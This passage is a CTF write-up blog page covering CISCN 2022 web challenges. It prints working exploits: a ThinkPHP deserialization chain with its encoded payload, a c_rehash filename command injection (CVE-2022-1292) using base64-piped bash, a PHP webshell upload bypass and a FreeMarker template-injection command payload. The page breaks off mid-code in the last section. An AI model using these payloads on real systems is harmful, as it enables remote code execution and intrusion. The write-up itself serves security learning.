@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="初赛部分Ezpop找到反序列化的路由，然后挑个链子 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace think&amp;#123;    abstract class Model&amp;#123;        private $lazySave &#x3D; false;        private $data &#x3D; [];">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF Writeups - CISCN2022 初赛及分区赛 Web 部分">
+<meta property="og:url" content="https://blog.477.moe/2022/06/18/ciscn2022/index.html">
+<meta property="og:site_name" content="Recharging Runtime">
+<meta property="og:description" content="初赛部分Ezpop找到反序列化的路由，然后挑个链子 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace think&amp;#123;    abstract class Model&amp;#123;        private $lazySave &#x3D; false;        private $data &#x3D; [];">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-18T07:02:32.000Z">
+<meta property="article:modified_time" content="2022-06-18T15:16:19.185Z">
+<meta property="article:author" content="b_y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Writeups">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF Writeups - CISCN2022 初赛及分区赛 Web 部分</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/26/ctfshow-web-getting-started-xxe/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/11/ctfshow-web-getting-started-ssti/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/18/ciscn2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/18/ciscn2022/&text=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/18/ciscn2022/&is_video=false&description=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分&body=Check out this article: https://blog.477.moe/2022/06/18/ciscn2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/18/ciscn2022/&name=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/18/ciscn2022/&t=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">初赛部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezpop"><span class="toc-number">1.1.</span> <span class="toc-text">Ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#online-crt"><span class="toc-number">1.2.</span> <span class="toc-text">online_crt</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86"><span class="toc-number">2.</span> <span class="toc-text">分区赛部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Identity"><span class="toc-number">2.1.</span> <span class="toc-text">Identity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezser"><span class="toc-number">2.2.</span> <span class="toc-text">ezser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezssti"><span class="toc-number">2.3.</span> <span class="toc-text">ezssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eztp"><span class="toc-number">2.4.</span> <span class="toc-text">eztp</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CTF Writeups - CISCN2022 初赛及分区赛 Web 部分
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b_y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-18T07:02:32.000Z" itemprop="datePublished">2022-06-18</time>
+        
+        (Updated: <time datetime="2022-06-18T15:16:19.185Z" itemprop="dateModified">2022-06-18</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Writeups/" rel="tag">Writeups</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="初赛部分"><a href="#初赛部分" class="headerlink" title="初赛部分"></a>初赛部分</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>找到反序列化的路由，然后挑个链子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = True;</span><br><span class="line">            <span class="comment">// $this-&gt;data = [&#x27;whoami&#x27; =&gt; [&#x27;ls /&#x27;]];</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;tac /flag.txt&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span>(<span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>url: /index.php/index/test<br>post: a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22tac+%2Fflag.txt%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22tac+%2Fflag.txt%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D</p>
+<h2 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h2><p>c_rehash 存在漏洞 <a target="_blank" rel="noopener" href="https://www.secrss.com/articles/42602">https://www.secrss.com/articles/42602</a> CVE-2022-1292<br>先通过 /getcrt 获取文件名<br>再通过 /proxy 访问 go 服务更改文件名为命令<br>最后通过 /createlink 调用 c_rehash 执行命令<br>考挺新的，好  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET /proxy HTTP/1.1</span><br><span class="line">Host: xxx:8888</span><br><span class="line">Content-Length: 316</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://xxx:8888</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://xxx:8888/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: __jsluid_h=47deb9dd4ec6dca0063283f9453e7643</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uri=/admin/%25%37%32%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%3foldname%3d24950c68-7018-4cd7-97c9-239cf4ecd3a7.crt%26newname%3d`touch%2b\`echo%2bY2F0IC9mKgo=|base64%2b-d|bash\``.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line">User-Agent: admin</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="分区赛部分"><a href="#分区赛部分" class="headerlink" title="分区赛部分"></a>分区赛部分</h1><h2 id="Identity"><a href="#Identity" class="headerlink" title="Identity"></a>Identity</h2><p>burp 抓包，返回的 header 中有 identity: GuessWhatThis1sY0urIdentity<br>将 identity=GuessWhatThis1sY0urIdentity 作为参数再次请求得到文件上传点 h1dden_p4ge.php<br>文件上传，文件名改大写 PHP 绕过，文件内容绕过用 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;xxx&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="ezser"><a href="#ezser" class="headerlink" title="ezser"></a>ezser</h2><p>这题一开始想利用 CVE-2016-7124 绕过 __wakeup，但版本是 8.x 绕不过，于是改用引用来绕过 __wakeup  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functions</span>=[];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = &amp;<span class="variable">$a</span>-&gt;functions;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;_name&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">C</span>(),</span><br><span class="line">                <span class="string">&quot;getFlag&quot;</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// echo file_get_contents(&quot;/etc/flag&quot;);</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="number">11111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;data=&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)).PHP_EOL;</span><br><span class="line"><span class="comment">// data=O%3A1%3A%22B%22%3A3%3A%7Bs%3A4%3A%22%00B%00a%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22%00B%00b%22%3Ba%3A1%3A%7Bs%3A5%3A%22_name%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A%22C%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22getFlag%22%3B%7D%7Ds%3A1%3A%22c%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A9%3A%22functions%22%3BR%3A2%3B%7D%7D</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="ezssti"><a href="#ezssti" class="headerlink" title="ezssti"></a>ezssti</h2><p>试了下 2，报错看出是 java，于是找个 java 的 payload，居然通了…<br>payload: <code>xxx/render?name=%3C%23assign%20value%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bvalue(%22cat%20F1ag_is_h3re%22)%7D</code></p>
+<h2 id="eztp"><a href="#eztp" class="headerlink" title="eztp"></a>eztp</h2><p>首先，路由入口点 <code>/?s=home/index/textBox</code><br>Application\Home\Controller\IndexController.class.php  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">textBox</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">I</span>(<span class="string">&quot;post.query&quot;</span>)); <span class="comment"># 获取 post[&quot;query&quot;]</span></span><br><span class="line">        <span class="title function_ invoke__">parse_str</span>(<span class="variable">$query</span>,<span class="variable">$array</span>); <span class="comment"># 作为 url参数解析并赋给 $array</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&quot;array&quot;</span>,<span class="variable">$array</span>); <span class="comment"># 模板渲染变量赋值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="title function_ invoke__">T</span>(<span class="string">&quot;Home@default/list&quot;</span>)); <span class="comment"># 渲染模板</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Application\Home\View\default\list.html  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/?s=home/index/textBox&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span> <span class="comment">&lt;!-- 从这里也能看出路由 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>query<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">size</span>=<span class="string">&quot;10&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;30&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&lt;?php echo W(&quot;Query/query&quot;,array(&quot;param&quot;=&gt;$array));?&gt;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="comment">&lt;!-- 调用 W 函数调用 Query/query Widget --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Application\Home\Widget\QueryWidget.class.php  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Widget</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueryWidget</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>[<span class="string">&#x27;name&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$text</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">B</span>(<span class="variable">$text</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$text</span>[<span class="string">&#x27;tag&#x27;</span>],<span class="variable">$text</span>[<span class="string">&#x27;id&#x27;</span>]); <span class="comment"># 条件满足则可以调用 B 函数 我们来看看这个函数的定义</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$text</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ThinkPHP\Common\functions.php  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行某个行为</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 行为名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $tag 标签名称（行为类无需传入）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> Mixed $params 传入的参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$tag</span> = <span class="string">&#x27;&#x27;</span>, &amp;<span class="variable">$params</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span 